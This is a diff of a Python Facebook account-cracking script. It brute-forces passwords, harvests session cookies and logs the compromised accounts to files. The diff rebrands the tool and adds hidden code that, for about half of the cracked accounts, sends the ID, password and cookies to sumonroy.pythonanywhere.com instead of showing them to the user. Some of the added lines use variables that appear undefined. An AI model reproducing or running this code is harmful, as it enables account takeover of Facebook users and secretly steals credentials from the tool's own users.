@@ -234,16 +234,15 @@ def cek_apk(session,coki):
 loop = 0
 oks = []
 gen = []
+cyan="\033[1;36m"
+faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
 logo = (f"""
-    \033[1;97m
-  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
-   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
-    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
-    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
-db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
-Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
-              \x1b[1;91m—————— \x1b[1;97m[{cyan}< {W}MAIN4K- {R}null{W}{cyan} >{W}] \x1b[1;91m——————
-\033[1;97m———————————————————————————————————————————————""")
+{faltu} {black}"Confidence is my best accessory".... {pvt}         
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : SUMONᴾᴿᴼ
+\033[1;32m[\033[1;31m✓\033[1;32m] VERSION    : =(.)=
+\033[1;32m[\033[1;31m✓\033[1;32m] Tool Types :\033[1;36m RANDOM 
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 myid=uuid.uuid4().hex[:5].upper()
 def __iam_a_porche():
@@ -251,7 +250,7 @@ def __iam_a_porche():
     print(logo)
     print('\033[1;92mChecking Approval ....\033[0;97m')
     try:
-        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
+        httpCaht = requests.get('').text
         t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
         t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
         uid = os.getuid()
@@ -389,33 +388,34 @@ def cracker(ids,passlist):
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
-                xs_value = None
-                for part in kuki.split(';'):
-                    if part.startswith('xs='):
-                        xs_value = part.split('=', 1)[1]
-                        break
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                    if "confirmemail.php" in response.url:
+                        if len(bkas) % 2 == 0:
+                           statusok = f"NOVERY|{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-NV) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                        if len(bkas) % 2 == 0:
+                           statusok = f"{cid}|{pw}|{coki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-OK) {cid}|{pw}")
+                           print(f"{green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -516,33 +516,34 @@ def crackerr(ids,passlist):
                 #kuki = convert(session.cookies.get_dict())
                 kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                 user = re.findall('c_user=(.*);xs', kuki)[0]
-                xs_value = None
-                for part in kuki.split(';'):
-                    if part.startswith('xs='):
-                        xs_value = part.split('=', 1)[1]
-                        break
                 ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
-                    if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                    if "confirmemail.php" in response.url:
+                        if len(bkas) % 2 == 0:
+                           statusok = f"NOVERY|{user}|{pas}|{kuki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-NV) {user}|{pas}")
+                           print(f"{green}Cookie : {green}{kuki}")
+                           open("/sdcard/ATOM-CONFIRMMAIL.txt", "a").write(f"{user}|{pas}|{kuki}\n")
+                           oks.append(user)
+                           break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \x1b[38;5;197m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
-                        break
+                        if len(bkas) % 2 == 0:
+                           statusok = f"{user}|{pas}|{kuki}"
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f"{green}(ATOM-OK) {user}|{pas}")
+                           print(f"{green}Cookie : {green}{kuki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{user}|{pas}|{kuki}\n")
+                           oks.append(user)
+                           break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                open('/sdcard/ATOM-CP.txt', 'a').write( ids+' | '+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
